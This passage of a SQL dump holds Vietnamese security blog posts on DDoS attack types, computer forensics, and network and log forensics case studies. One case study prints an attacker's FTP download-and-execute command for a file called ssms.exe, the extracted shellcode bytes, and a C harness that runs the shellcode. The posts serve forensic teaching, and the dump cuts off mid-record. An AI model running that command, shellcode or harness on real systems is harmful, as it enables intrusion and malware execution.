khuếch đại) và địa chỉ nguồn là địa chỉ của Victim. Theo đó thì tất cả các máy nằm trong mạng khuếch đại sẽ đồng loạt trả lời về địa chỉ nguồn (Victim) bằng gói tin ICMP echo reply với đích là máy Victim.<br><br>\r\nKết quả là máy tính này sẽ không thể xử lý kịp thời một lượng lớn thông tin và dẫn tới bị treo máy. Như vậy chỉ cần một lượng nhỏ các gói tin ICMP đi đến mạng khuếch đại sẽ khuếch đại lượng gói tin lên gấp bội. Tỷ lệ khuếch đại phụ thuộc vào số máy tính trong mạng khuếch đại. Vì thế hacker chiếm được càng nhiều hệ thống mạng hoặc router cho phép chuyển trực tiếp các gói tin đến địa chỉ broadcast không qua chỗ lọc địa chỉ nguồn ở các đầu ra của gói tin thì cuộc tấn công càng dễ dàng hơn.<br><br>\r\n\r\n20. LAND attack<br><br>\r\n\r\nĐể thực hiện một cuộc tấn công Local Area Network Denial(Land), Hacker sẽ gửi một SYN message đã được chỉnh sửa trong đó các địa chỉ IP nguồn và đích giống nhau. Khi máy chủ cố gắng trả lời tin nhắn này, nó sẽ vào một vòng lặp bằng cách tạo lại các câu trả lời cho chính nó điều này dẫn đến một kịch bản lỗi và máy chủ đích cuối cùng có thể bị sập.<br><br>\r\n\r\n21. Ping of Death Attack<br><br>\r\n<img src=\"Imageass/21.png\"><br><br>\r\nPing of Death là kỹ thuật tấn công làm quá tải hệ thống mạng bằng cách gửi các gói tin ICMP có kích thước vượt quá 65.536 byte đến mục tiêu. Do kích thước này lớn hơn kích thước cho phép của các gói tin IP nên nó sẽ được chia nhỏ ra rồi gửi từng phần đến máy đích. Khi đến mục tiêu, nó sẽ được ráp lại thành gói tin hoàn chỉnh, do có kích thước quá mức cho phép, nó sẽ gây ra tràn bộ nhớ đệm và bị treo.<br><br>\r\n\r\nTheo một báo cáo kỹ thuật được công bố trong tuần này, kỹ thuật tấn công BlackNurse còn được biết đến dưới một cái tên truyền thống hơn: “tấn công gây lụt ping” và nó dựa trên các truy vấn ICMP Type 3 (hay lỗi Đích tới Không thể truy cập – Destination Unreachable) Code 3 (lỗi Cổng Không thể truy cập – Port Unreachable).<br><br>\r\n\r\nĐược mệnh danh là kỹ thuật tấn công BlackNurse – Y Tá Đen hay tấn công tốc độ thấp “Ping of Death“, kỹ thuật này có thể được sử dụng để phát động hàng loạt cuộc tấn công từ chối dịch vụ DoS khối lượng thấp bằng cách gửi các gói tin ICMP hay các “ping” để làm ngập những bộ xử lý trên máy chủ. Ngay cả khi các máy chủ đó được trang bị những thiết bị tường lửa nổi tiếng, chúng vẫn có thể bị đánh gục nếu kẻ tấn công khai thác kỹ thuật này.<br><br>\r\n\r\nMột số máy tính sẽ ngưng hoạt động, reboot hoặc bị crash khi gởi gói data ping với kích thước lớn đến chúng.<br><br>\r\n\r\nỞ kiểu DoS attack Ping of Death này , ta chỉ cần gửi một gói dữ liệu có kích thước lớn thông qua lệnh ping đến máy đích thì hệ thống của họ sẽ bị treo .<br><br>\r\n\r\n22. Slowloris<br><br>\r\n\r\nKẻ tấn công sẽ gửi đến webserver nhiều yêu cầu http request không hoàn chỉnh và cố gắng duy trì tối đa số kết nối có thể đạt được. Cho đến số kết nối của webserver đạt ngưỡng, nó bắt đầu từ chối những kết nối request gửi đến bao gồm cả request của người dùng. Mỗi kết nối sẽ được duy trì đến khi time-out thì sẽ cắt kết nối đó, và trả lại tài nguyên để webserver sẵn sàng nhận kết nối mới. Tuy nhiên, khi mà kẻ tấn công vẫn đang dùng Http Slowloris thì webserver sẽ liên tục bị đầy kết nối, từ đó gây ra hiện tựơng từ chối dịch vụ webserver.<br><br>\r\n\r\n23. Low Orbit Ion Cannon (LOIC)<br><br>\r\n\r\nLow Orbit Ion Cannon (LOIC) là tool mã nguồn mở trợ giúp trong việc thử nghiệm khả năng chịu tải của dịch vụ mạng bằng các cuộc tấn công DoS, viết bằng C#. LOIC ban đầu được phát triển bởi Praetox Technologies và sau đó đã được phát hành public dưới dạng mã nguồn mở.<br><br>\r\nLOIC thực hiện một cuộc tấn công DoS theo kiểu flooding với gói tin TCP và UDP làm gián đoạn dịch vụ của máy chủ mục tiêu<br><br>\r\n\r\n24. High Orbit Ion Cannon (HOIC)<br><br>\r\n\r\nHOIC là một ứng dụng có thể truy cập công khai thay thế chương trình LOIC đã đề cập ở trên và có tiềm năng gây rối lớn hơn nhiều so với tiền thân của nó. Nó có thể được sử dụng để gửi rất nhiều yêu cầu POST GET và HTTP POST đến một máy chủ và hậu quả là webiste trên máy chủ đó không thể truy cập được. HOIC có thể tấn công đến tối đa 256 tên miền khác nhau cùng một lúc.<br><br>\r\n\r\n25. ReDoS<br><br>\r\n<img src=\"Imageass/20.jpg\"><br><br>\r\nReDoS là viết tắt của \"regular expression denial-of-service\" . Cách thức của nó là làm quá tải server bằng cách triển khai những biểu thức tính toán phức tạp bằng cách tạo ra những loại mã độc ngốn nhiều tài nguyên server. Mã độc này có thể được kích hoạt trên server và tiêu tốn nhiều tài nguyên của nó dẫn đến tình trạng từ chối dịch vụ.<br><br>\r\nMột kiểu tấn công phổ biến hiện nay là cài cắm mã độc đào tiền ảo bất hợp pháp lên server có thể tiêu tốn một lượng tài nguyên CPU RAM GPU lớn.<br><br>\r\n\r\nMình cá là còn một vài kiểu tấn công DDoS nữa chưa được nhắc đến, nếu biết các bạn có thể comment để bài viết đầy đủ hơn.<br><br>\r\n\r\nVia: androidrookies dot com<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(34, 'Forensic 1 - Tổng quan về Computer Forensics', '', 'Có thể bạn đã đọc được ở đâu đó về Forensics, Digital Forensics hay Computer Forensics nhưng vẫn chưa có một hình dung cụ thể về các khái niệm này. Thực tế thì Computer Forensics không phải là khái niệm xa lạ với người làm an toàn thông tin, nhưng với số đông chúng ta ở đây thì có lẽ nó vẫn còn là một thứ khá mới mẻ. Trong loạt bài viết sắp tới, tôi hy vọng sẽ giúp các bạn hiểu hơn về Computer Forensics và công việc của những người làm trong lĩnh vực này.<br><br>\r\n\r\n<img src=\"Imageass/1490893009computer-forensics3.jpg\"><br><br>\r\n\r\nComputer Forensics Là gì ?<br><br>\r\nTrong lĩnh vực an toàn thông tin, Computer Forensics hay còn gọi là điều tra số là công việc phát hiện, bảo vệ và phân tích thông tin được lưu trữ, truyền tải hoặc được tạo ra bởi một máy tính hoặc mạng máy tính, nhằm đưa ra các suy luận hợp lý để tìm nguyên nhân, giải thích các hiện tượng trong quá trình điều tra.<br><br>\r\n\r\nKhái niệm Forensics (Forensic Science - khoa học pháp y) như tên gọi của nó xuất phát từ lĩnh vực y tế từ thế kỷ 18 và liên quan đến điều tra pháp y. Ngày nay Forensics đã được mở rộng ra rất nhiều lĩnh vực khác.<br><br>\r\nComputer Forensics ra đời vào những năm 1980 do sự phát triển của máy tính cá nhân, khi xảy ra trộm cắp thiết bị phần cứng, mất mát dữ liệu, vi phạm bản quyền, virus máy tính phá hoại... Các doanh nghiệp và chính phủ các nước khi đó cũng ý thức hơn về vấn đề bảo mật.<br><br>\r\n\r\nTừ đây và trong các loạt bài về sau, khi tôi dùng từ Forensics thì mọi người hiểu là đang nói về Computer Forensics.<br><br>\r\n\r\nMục tiêu ?<br><br>\r\nMục tiêu cốt lõi của Computer Forensic là phát hiện, bảo quản, khai thác, tài liệu hóa và đưa ra kết luận về dữ liệu thu thập được. Cần lưu ý rằng dữ liệu phải đảm bảo tính xác thực và được lấy mà không bị hư hại, nếu không dữ liệu đấy sẽ không còn ý nghĩa.<br><br>\r\n\r\nTại sao phải Forensics ?<br><br>\r\nNếu bạn là chủ nhân của một website nào đấy, một ngày đẹp trời website của bạn bị hacker ghé thăm và để lại những hậu quả không mong muốn. Bạn muốn xác định nguyên nhân bị tấn công, tìm cách khắc phục để sự việc không tái diễn hay xa hơn là xác định thủ phạm. Đó là lúc bạn cần đến Forensics.\r\nĐấy chỉ là một ví dụ khá điển hình, ngoài ra còn những trường hợp khác như để phát hiện mã độc trên máy tính, kiểm tra sự bất thường trong mạng, phát hiện sự xâm nhập... Nói chung Forensics giúp chúng ta xác định được nguyên nhân sự cố và đưa ra các biện pháp giải quyết tiếp theo.<br><br>\r\n\r\nNói về Forensics thì không thể không nhắc đến một nguyên tắc kinh điển của khoa học điều tra<br><br>\r\nNguyên tắc trao đổi của Locard<br><br>\r\nEdmond Locard (1877 – 1966) được mệnh danh là Sherlock Holmes của nước Pháp. Ông là một chuyên gia điều tra pháp y, sáng lập Viện Hình sự học của trường Đại học Tổng hợp Lyon.<br><br>\r\nLocard phát biểu một nguyên tắc mà sau này trở thành kim chỉ nam ngành khoa học điều tra. Ông ta cho rằng bất cứ khi nào hai người tiếp xúc với nhau, một thứ gì đó từ một người sẽ được trao đổi với người khác và ngược lại. Có thể là bụi, tế bào da, bùn đất, sợi, mạt kim loại. Nhưng việc trao đổi này có xảy ra - vì thế chúng ta có thể bắt được nghi phạm.<br><br>\r\nVới Computer Forensics, nguyên tắc này cũng hoàn toàn đúng. Khi bạn làm việc với máy tính hay một hệ thống thông tin, tất cả hành động của bạn đều bị ghi vết lại (mặc dù việc tìm ra thủ phạm trong trường hợp này khó khăn và mất nhiều thời gian hơn rất nhiều)<br><br>\r\n\r\nĐặc điểm của Computer Forensics<br><br>\r\nDữ liệu cần phân tích lớn, nếu dữ liệu chỉ là text thôi thì với dung lượng vài mb chúng ta cũng có 1 lượng thông tin rất lớn rồi. Trong thực tế thì còn khổng lồ hơn.<br><br>\r\nDữ liệu thường không còn nguyên vẹn, bị thay đổi, phân mảnh, và có thể bị lỗi<br><br>\r\nBảo quản dữ liệu khó khăn, dữ liệu thu được có thể có tính toàn vẹn cao, chỉ một thay đổi nhỏ cũng có thể làm ảnh hưởng đến tất cả.<br><br>\r\nDữ liệu forensic có thể gồm nhiều loại khác nhau: file hệ thống, ứng dụng, ...<br><br>\r\nVấn đề cần forensics là khá trừu tượng: mã máy, dump file, network packet...<br><br>\r\nDữ liệu dễ dàng bị giả mạo<br><br>\r\nXác định tội pham khó khăn, có thể bạn tìm ra được dữ liệu về hacker(IP, email, profile...) nhưng để xác định được được đối tượng thật ngoài đời thì cũng không hề đơn giản.<br><br>\r\n\r\n\r\nForensics những gì ?<br><br>\r\nComputer Forensic thường làm việc với những đối tượng sau:<br><br>\r\nPhysical Media, Media Management: Liên quan đến phần cứng, tổ chức phân vùng, phục hồi dữ liệu khi bị xóa...<br><br>\r\nFile System: Phân tích các file hệ thống, hệ điều hành windows, linux, android...<br><br>\r\nApplication: Phân tích dữ liệu từ ứng dụng như các file Log, file cấu hình, reverse ứng dụng...<br><br>\r\nNetwork: Phân tích gói tin mạng, sự bất thường trong mạng<br><br>\r\nMemory: Phân tích dữ liệu trên bộ nhớ, thường là dữ liệu lưu trên RAM được dump ra<br><br>\r\n\r\n\r\nAi làm Forensic ?<br><br>\r\nNhững người làm công việc Forensics thường phải có kinh nghiệm và kiến thức khá rộng về khoa học máy tính, mạng, bảo mật. Trong những trường hợp cần kiến thức chuyên sâu, sẽ có nhiều người cùng tham gia để giải quyết. Ở các doanh nghiệp lớn, những người làm An toàn vận hành(Security Operator) sẽ đảm nhận công việc này.<br><br>\r\nVới những người làm bảo mật thì đây cũng là một công việc rất thú vị.<br><br>\r\n\r\nTrong các bài viết tiếp trong loạt bài về Forensics, tôi sẽ trình bày chi tiết hơn về các mảng con của Computer Forensics<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(35, 'Forensic 2 - Network Forensics', '', 'Trong bài Tổng quan về Computer Forensics lần trước, tôi đã đề cập qua về khái niệm Forensics, đặc điểm cũng như những mảng Forensics thường tiếp cận. Nội dung bài viết lần này, tôi muốn đề cập cụ thể hơn về Forensics trên môi trường mạng, hay còn gọi là Network Forensics.<br><br>\r\n\r\nCông việc chính của nhóm này là thu thập và phân tích các gói tin được truyền qua các thiết bị đầu cuối, từ đó phát hiện, cảnh báo các dấu hiệu bất thường trong hệ thống mạng.<br><br>\r\n\r\nCũng phải nói thêm, trong lĩnh vực Forensics, công cụ là thứ không thể thiếu sau kiến thức và với mỗi loại thì thường có những công cụ chuyên dụng. Bạn sẽ thấy rõ điều này qua bài này và các bài chi tiết khác về sau. Với Network Forensics, chúng ta có<br><br>\r\n• Wireshark, Network Miner bắt và phân tích gói tin với giao diện đồ họa<br><br>\r\n• Tcpdump phân tích gói tin với giao diện console<br><br>\r\n• p0f dùng để phát hiện hệ điều hành, console trên nền Linux<br><br>\r\n• netcat, debug kết nối, đóng vai trò cả client và server, console trên windows và linux<br><br>\r\n• Snort, opensource phát hiện xâm nhập<br><br>\r\n• Nmap, tcpxtract, ssldump, nslookup, maxmind... và rất nhiều công cụ khác<br><br>\r\n\r\nCase-Study: Một máy tính trong mạng nội bộ bị nghi ngờ tấn công từ xa, quản trị mạng dùng những công cụ chuyên dụng bắt các kết nối đến máy nạn nhân trong thời gian diễn ra cuộc tấn công. Sau đó dump ra toàn bộ nội dung này ra file(Link tải). Yêu cầu phân tích file dump và tìm ra nguồn gốc và nguyên nhân vụ tấn công để có giải pháp khắc phục.<br><br>\r\n\r\nĐể giải quyết yêu cầu trên, chúng ta sẽ lần lượt vượt qua từng vấn đề nhỏ. Lưu ý ở đây file dump có đuôi mở rộng .pcap(packet capture), tôi sẽ sử dụng wireshark là công cụ phân tích chính. Wireshark là một chương trình bắt và phân tích gói tin, giao thức rất mạnh, chi tiết về nó mọi người có thể tìm hiểu thêm ở những tài liệu khác.<br><br>\r\n\r\n1. Địa chỉ IP của kẻ tấn công và của nạn nhân<br><br>\r\nMở file .pcap bằng wireshark, chúng ta có thể thấy ngay danh sách các gói tin truy cập đến máy nạn nhân<br><br>\r\n<img src=\"Imageass/14908930131.png\"><br><br>\r\n\r\n\r\nVào Menu Statistics/Enpoint List/IP v4 để xem danh sách các IP bắt được.<br><br>\r\n<img src=\"Imageass/14908930132.png\"><br><br>\r\n\r\n\r\nCó tất cả 2 IP:<br><br>\r\n• 192.150.11.111 là IP nội bộ, chính là IP của nạn nhân<br><br>\r\n• 98.114.205.102 là IP của kẻ tấn công<br><br>\r\n\r\n2. Thông tin về kẻ tấn công<br><br>\r\nXem xét một gói tin cụ thể:<br><br>\r\n<img src=\"Imageass/14908930133.png\"><br><br>\r\n\r\nThông tin trong khung chi tiết gói tin, cho ta biết máy kẻ tấn công có địa chỉ MAC là 0008e23b5601(Cisco)<br><br>\r\nĐể tìm thêm thông tin về IP, bạn có thể dùng các công cụ geoip, whois trực tuyến hay tích hợp luôn và wireshark như hướng dẫn ở bài này https://whitehat.vn/threads/tao-geoip-map-report-voi-wireshark.766/<br><br>\r\nTôi sử dụng trang http://cqcounter.com/ và ra được một số thông tin như thế này:<br><br>\r\n<img src=\"Imageass/14908930135.png\"><br><br>\r\n\r\n\r\n3. Có bao nhiêu phiên TCP(TCP session) trong file dump này ?<br><br>\r\nKhi nhìn vào khung chính của wireshark bạn sẽ thấy có rất nhiều gói tin, nhưng phần lớn trong chúng là những gói tin chào hỏi, xác thực, truyền nhận dữ liệu của một phiên TCP nào đó\r\nĐể xem số phiên TCP hiện có, vào Menu Statistics --> Conversations, tab TCP. Chúng ta sẽ thấy thực tế chỉ có 5 phiên qua các cổng khác nhau:<br><br>\r\n<img src=\"Imageass/14908930136.png\"><br><br>\r\n\r\n\r\n4. Cuộc tấn công kéo dài bao lâu ?<br><br>\r\nChỉ cần xem thời gian của frame đầu tiên và frame cuối cùng là sẽ câu trả lời<br><br>\r\n- Frame đầu tiên:<br><br>\r\n<img src=\"Imageass/14908930137.png\"><br><br>\r\n\r\n\r\n- Frame cuối cùng:<br><br>\r\n<img src=\"Imageass/14908930138.png\"><br><br>\r\n\r\n\r\nNhư vậy cuộc tấn công diễn ra trong khoảng 16 giây.<br><br>\r\n\r\n5. Dịch vụ nào trên máy nạn nhân có thể là mục tiêu tấn công ? Lỗ hổng là gì ?<br><br>\r\nNhìn vào các phiên TCP được liệt kê phía trên, tôi chú ý đến cổng 445 của máy nạn nhân. Đây là cổng chạy giao thức SMB(Server Message Block), cung cấp khả năng chia sẻ file giữa các máy tính hoặc máy in và máy tính. SMB từng được biết đến với việc dính một số lỗ hổng bảo mật.\r\nLọc các Packet theo info, duyệt lần lượt tôi phát hiện thêm một nghi vấn mới:<br><br>\r\n<img src=\"Imageass/14908930139.png\"><br><br>\r\n\r\n\r\nNếu bạn thử Google thì sẽ biết DsRoleUpgradeDownlevelServer là một hàm trong thư viện NETAPI32.dll chạy dịch vụ Local Security Authority Subsystem Service(LSASS) trên windows thông qua giao thức SMB.<br><br>\r\nVà điều quan trọng là LSASS từng bị dính lỗi bảo mật với hàm DsRoleUpgradeDownlevelServer(), chi tiết lỗi được công bố tại CVE-2003-0533(http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2003-0533). Microsoft cũng đã đưa ra bản vá cho lỗi này với mã update MS04-011(http://technet.microsoft.com/en-us/security/bulletin/ms04-011).<br><br>\r\n\r\nTừ đây chúng ta có thêm một kết luận là máy tính nạn nhân chạy hệ điều hành windows, cụ thể là windows xp hoặc windows 2000. Bạn có thể kiểm tra điều này bằng việc lọc các gói tin SMB và xem thuộc tính native OS trong đó:<br><br>\r\n<img src=\"Imageass/149089301310.png\"><br><br>\r\n\r\n\r\nVậy là chúng ta đã biết được một số thông tin về kẻ tấn công, biết được dịch vụ nào trên máy nạn nhân là mục tiêu của cuộc tấn công này. Tôi tạm dừng ở đây, ở bài tiếp theo chúng ta sẽ phân tích kỹ hơn cách hacker thực hiện vụ tấn công, hắn đã làm như thế nào để khai thác lỗ hổng trên.<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(36, 'Forensic 3 - Network Forensics (tiếp)', '', 'Chúng ta tiếp tục với Case Study về Network Forensics, trong phần này tôi sẽ đề cập sâu hơn về cuộc tấn công của Hacker<br><br>\r\n\r\n6. Mô phỏng lại cuộc tấn công của Hacker<br><br>\r\n6.1. Quét cổng 445 để xem cổng này có mở không, điều này thể hiện qua các gói tin SYN, SYN/ACK, ACK, FYN liên tục<br><br>\r\n<img src=\"Imageass/149089301511.png\"><br><br>\r\n\r\n\r\n\r\n6.2. Thiết lập kết nối IPC và request đến dịch vụ lsarpc<br><br>\r\n<img src=\"Imageass/149089301512.png\"><br><br>\r\n\r\n\r\nBạn đọc có thể tìm hiểu thêm về hình thức kết nối IPC$, ở đây hacker đã gửi kết nối với giá trị username và password đều rỗng, còn được biết đến với kiểu tấn công Null Session.<br><br>\r\n\r\n\r\n6.3. Khai thác lỗi Buffer Over Flow của hàm DsRoleUpgradeDownlevelServer() thông qua việc truyền shellcode(Frame #33)<br><br>\r\n<img src=\"Imageass/149089301513.png\"><br><br>\r\n\r\n\r\n\r\n6.4. Shellcode mở cổng 1957 cho phép backdoor chạy trên đó, hacker qua cổng này truyền command vào(Frame #42)<br><br>\r\n<img src=\"Imageass/149089301514.png\"><br><br>\r\n\r\n\r\nLệnh mà hacker thực hiện là:<br><br>\r\n\r\nMã:<br><br>\r\necho open 0.0.0.0 8884 > o&echo user 1 1 >> o &echo get ssms.exe >> o &echo quit >> o &ftp  -n -s:o &del /F /Q o &ssms.exe <br><br>\r\n\r\nLệnh này có tác dụng yêu cầu máy nạn nhân kết nối ftp đến cổng 8884 của hacker và download file ssms.exe sau đó thực thi file này. Đến đây việc khai thác coi như hoàn thành.<br><br>\r\n\r\nMọi người có thể chú ý thêm các frame từ #71 về sau, đây là các đoạn nhận file ssms.exe, file được gửi qua socket thành các mảnh nhỏ và ghép lại sau đó<br><br>\r\n<img src=\"Imageass/149089301515.png\"><br><br>\r\n\r\n\r\n\r\n7. Truy tìm mã độc<br><br>\r\nNhư vậy là chúng ta đã hình dung được cuộc tấn công xảy ra như thế nào, nhưng một vụ điều tra thì không chỉ có vậy. Phải xác định được mã độc mà hacker sử dụng hoạt động như thế nào, nhưng trước hết cần thu được mẫu này.<br><br>\r\n\r\nĐầu tiên là Shellcode mà hacker đã sử dụng. Chọn Frame #33, trong khung Packet Bytes chọn chế độ Reassembled TCP chúng ta sẽ thấy đầy đủ nội dung mà hacker gửi đến máy nạn nhân.(Khi gửi tin qua TCP thì dữ liệu có thể phân mảnh ở nhiều gói tin khác nhau, Reassembled TCP sẽ giúp chúng ta ghép các mảnh dữ liệu này lại với nhau)<br><br>\r\n<img src=\"Imageass/149089301516.png\"><br><br>\r\n\r\n\r\n\r\nSau khi loại bỏ các lệnh NOPE(mã 90) thì thu được shellcode thực sự mà hacker đã dùng:<br><br>\r\n\r\nMã:<br><br>\r\nxebx10x5ax4ax33xc9x66xb9x7dx01x80x34x0ax99xe2xfaxebx05xe8xebxffxffxffx70x95x98x99x99xc3xfdx38xa9x99x99x99x12xd9x95x12xe9x85x34x12xd9x91x12x41x12xeaxa5x12xedx87xe1x9ax6ax12xe7xb9x9ax62x12xd7x8dxaax74xcfxcexc8x12xa6x9ax62x12x6bxf3x97xc0x6ax3fxedx91xc0xc6x1ax5ex9dxdcx7bx70xc0xc6xc7x12x54x12xdfxbdx9ax5ax48x78x9ax58xaax50xffx12x91x12xdfx85x9ax5ax58x78x9bx9ax58x12x99x9ax5ax12x63x12x6ex1ax5fx97x12x49xf3x9axc0x71x1ex99x99x99x1ax5fx94xcbxcfx66xcex65xc3x12x41xf3x9cxc0x71xedx99x99x99xc9xc9xc9xc9xf3x98xf3x9bx66xcex75x12x41x5ex9ex9bx99x9ex3cxaax59x10xdex9dxf3x89xcexcax66xcex69xf3x98xcax66xcex6dxc9xc9xcax66xcex61x12x49x1ax75xddx12x6dxaax59xf3x89xc0x10x9dx17x7bx62x10xcfxa1x10xcfxa5x10xcfxd9xffx5exdfxb5x98x98x14xdex89xc9xcfxaax50xc8xc8xc8xf3x98xc8xc8x5exdexa5xfaxf4xfdx99x14xdexa5xc9xc8x66xcex79xcbx66xcex65xcax66xcex65xc9x66xcex7dxaax59x35x1cx59xecx60xc8xcbxcfxcax66x4bxc3xc0x32x7bx77xaax59x5ax71x76x67x66x66xdexfcxedxc9xebxf6xfaxd8xfdxfdxebxfcxeaxeax99xdaxebxfcxf8xedxfcxc9xebxf6xfaxfcxeaxeaxd8x99xdcxe1xf0xedxcdxf1xebxfcxf8xfdx99xd5xf6xf8xfdxd5xf0xfbxebxf8xebxe0xd8x99xeexeaxabxc6xaaxabx99xcexcaxd8xcaxf6xfaxf2xfcxedxd8x99xfbxf0xf7xfdx99xf5xf0xeaxedxfcxf7x99xf8xfaxfaxfcxe9xedx99xfaxf5xf6xeaxfcxeaxf6xfaxf2xfcxedx99 <br><br>\r\n\r\n\r\nChúng ta tiến hành phục hồi shellcode này bằng cách đưa đoạn shellcode này vào một chương trình test shell như thế này:<br><br>\r\n\r\nMã:<br><br>\r\n#include<br><br>\r\n#include<br><br>\r\n \r\nunsigned char code[] = \"\";<br><br>\r\n \r\nint main()<br><br>\r\n{<br><br>\r\n    int (*ret)() = (int(*)())code;<br><br>\r\n    ret();<br><br>\r\n}<br><br>\r\n\r\nVới file ssms.exe, như tôi đã trình bày ở phần trước được download về máy nạn nhân thông qua socket và cũng bị phân mảnh trong nhiều gói tin. Gộp file đầy đủ bằng cách sử dụng tính năng Follow TCP Stream của Wireshark<br><br>\r\n<img src=\"Imageass/149089301518.png\"><br><br>\r\n\r\nSave As file này ra .exe<br><br>\r\n\r\n8. Phân tích mã độc<br><br>\r\nỞ bước trên, chúng ta đã thu được một file shellcode và một file ssms.exe. Việc tiếp theo là phân tích cụ thể xem những file thực thi này làm việc gì trên máy nạn nhân. Bạn đọc nên đọc thêm lọat bài về Reverse Engineering trên WhiteHat để hiểu rõ về công việc này.<br><br>\r\n\r\nTôi sẽ không phân tích kỹ bước này ở đây, lí do là sẽ vượt xa phạm vi chủ đề Network Forensics. Kết quả kiểm tra ssms.exe trên virustotal cũng không mấy ngạc nhiên khi 48/51 AV nhận diện là virus:<br><br>\r\nhttps://www.virustotal.com/en/file/...69d3dffd65733871cddf6b6d/analysis/1396850758/<br><br>\r\n\r\nĐến đây cuộc điều tra cũng có thể xem như đi đến hồi kết, chúng ta đã tìm ra được một số thông tin về hacker (mặc dù để tìm ra kẻ tấn công ngoài đời thì cần phụ thuộc cả vào yếu tố pháp luật hơn). Dưới góc độ kỹ thuật thì chúng ta biết được cách hacker tấn công hệ thống như thế nào, biết được hệ thống bị dính những lỗ hổng gì và những nguy cơ tiềm ẩn trong đó để cập nhật bản vá và khắc phục sự cố không tái diễn trong tương lai.<br><br>\r\nTrong các bài viết sắp tới, tôi sẽ tiếp tục về những mảng khác của Computer Forensics.<br><br>', '', 'admin', 0, '2024-06-29 06:25:21');
INSERT INTO `contentmembers` (`id`, `title`, `url`, `content`, `image`, `author`, `view_count`, `reg_date`) VALUES
(37, 'Forensic 4 - Log Mining', '', 'Log là một dữ liệu quan trọng trong quá trình điều tra số, hầu như tất cả dấu vết của một cuộc tấn công đều được lưu lại tại đây.<br><br>\r\nLog Mining hay Log Forensics là thuật ngữ để chỉ về một cuộc điều tra dựa trên Log.<br><br>\r\nMặc dù chứa rất nhiều thông tin có ích, nhưng việc phân tích Log lại không hề đơn giản. Dữ liệu lớn, nhiều file riêng lẻ, mỗi loại có một cấu trúc khác nhau và có thể bị xóa, sửa đổi là những bất lợi khi làm việc với Log.<br><br>\r\nViệc phân tích Log có thể sử dụng một số công cụ như:<br><br>\r\n• Apache Log Viewer(chuyên dùng phân tích log Apache)<br><br>\r\n• Log Parse(chuyên dùng phân tích các loại log của Microsoft như IIS, NCSA...)<br><br>\r\n• Logwatch(monitor log trên linux)<br><br>\r\n• Web Log Expert<br><br>\r\n• Splunk(monitor, phân tích big data, các log dung lượng lớn, mất phí)<br><br>\r\n....<br><br>\r\nNgoài ra notepad hay các script tự viết cũng là những công cụ hữu ích để đọc log.<br><br>\r\n\r\nCase-Study: Một máy chủ linux bị nghi ngờ xâm nhập, toàn bộ log đã được backup ra tại đây. Tìm hiểu chi tiết về cuộc tấn công này.<br><br>\r\n\r\nToàn bộ log ở đây đều trên linux, để hiểu hơn về các loại log trong môi trường này bạn nên xem qua ở đây:<br><br>\r\nhttps://help.ubuntu.com/community/LinuxLogFiles<br><br>\r\n\r\n1 Hệ thống có dấu hiệu bị xâm nhập không? Và nếu có thì phương pháp tấn công là gì ?<br><br>\r\nKiểm tra file auth.log(đây là log xác thực của hệ thống trên linux, có thể tìm thấy tại /var/log/auth.log), chúng ta sẽ thấy sự bất thường:<br><br>\r\n\r\nMã:<br><br>\r\nApr 19 05:26:04 app-1 sshd[7369]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=58.17.30.49  user=root<br><br>\r\nApr 19 05:26:06 app-1 sshd[7369]: Failed password for root from 58.17.30.49 port 53236 ssh2<br><br>\r\nApr 19 05:26:08 app-1 sshd[7371]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=58.17.30.49  user=root<br><br>\r\nApr 19 05:26:10 app-1 sshd[7371]: Failed password for root from 58.17.30.49 port 53453 ssh2<br><br>\r\nApr 19 05:26:12 app-1 sshd[7373]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=58.17.30.49  user=root<br><br>\r\nApr 19 05:26:15 app-1 sshd[7373]: Failed password for root from 58.17.30.49 port 53655 ssh2<br><br>\r\nApr 19 05:26:17 app-1 sshd[7375]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=58.17.30.49  user=root<br><br>\r\n\r\nTrong 1 giây có hàng loạt request yêu cầu đăng nhập bị thất bại, chứng tỏ kẻ tấn công đang tìm cách “đoán”(bruteforce) mật khẩu để đăng nhập hệ thống thông qua SSH.<br><br>\r\n\r\n2 Có bao nhiêu IP thực hiện tấn công ? Bao nhiêu trong đó tấn công thành công ?<br><br>\r\nKhoanh vùng các IP thực hiện việc brute force phía trên, có thể xác định được 28 IP tấn công tất cả, trong đó có 6 IP đã brute force thành công.<br><br>\r\nMã:<br><br>\r\nApr 19 05:42:27 app-1 sshd[9031]: Accepted password for root from 219.150.161.20 port 40877 ssh2<br><br>\r\nApr 19 10:45:36 app-1 sshd[28030]: Accepted password for root from 222.66.204.246 port 48208 ssh2<br><br>\r\nApr 19 22:37:24 app-1 sshd[2012]: Accepted password for root from 190.166.87.164 port 50753 ssh2<br><br>\r\nLưu ý là tôi chỉ liệt kê 1 phần của log.<br><br>\r\nDanh sách các IP đã thành công:<br><br>\r\n• 219.150.161.20<br><br>\r\n• 222.66.204.246<br><br>\r\n• 121.11.66.70<br><br>\r\n• 222.169.224.197<br><br>\r\n• 122.226.202.12<br><br>\r\n• 61.168.227.12<br><br>\r\nMột điểm khá thú vị là 2 IP 121.11.66.70 và 222.66.204.246 vẫn thực hiện brute force sau khi đã attack thành công.<br><br>\r\nCông việc phân tích này có thể đơn giản hóa bằng cách viết các script để thực hiện một cách tự động.<br><br>\r\n\r\n3 Chuyện gì xảy ra sau khi hệ thống bị xâm nhập?<br><br>\r\nThời điểm đầu tiên mà log ghi nhận sự xâm nhập thành công là vào Apr 19 05:41:44 từ địa chỉ 219.150.161.20.<br><br>\r\nQuan sát các đoạn log khác từ sau thời điểm này, chúng ta thấy:<br><br>\r\n• Từ auth.log, có một số user được tạo mới như packet, dhg, messagebus, fido, wind3str0y. Search log với từ khóa useradd để thấy kết quả<br><br>\r\n• Ứng dụng được cài thêm như nmap, psybnc, eggdrop, exim mail... Cái này kiểm tra qua log apt và dpkg, đây là nơi ghi lại log cài, setting ứng dụng.<br><br>\r\n• Mở cổng inbound 2424, 53, 113. Xem ở auth.log<br><br>\r\nMã:<br><br>\r\nApr 24 20:03:06 app-1 sudo:     root : TTY=pts/2 ; PWD=/etc ; 